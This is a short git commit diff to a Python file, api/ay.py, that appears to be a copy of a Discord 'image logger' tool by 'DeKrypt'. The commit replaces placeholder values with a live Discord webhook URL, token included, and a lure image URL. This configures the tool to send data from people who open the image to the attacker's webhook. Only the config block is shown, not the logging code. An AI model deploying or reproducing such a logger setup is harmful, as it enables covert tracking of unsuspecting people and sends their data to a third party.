a48f1021bd9e1e04ca4f0880e73cd57f7676ee99
aymanboullal <162552466+aymanboullal@users.noreply.github.com>
2025-11-29 08:54:05 +0000

    Update ay.py

--- api/ay.py
+++ api/ay.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444248938260598865/Rf9lONDfxgI8Er9LLvlw3iClnQzeImXuN0s3BU-U9k-8BvMKlHhhjM4Q5og8r1jYPLdY",
+    "image": "https://img.lovepik.com/element/45015/3146.png_860.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
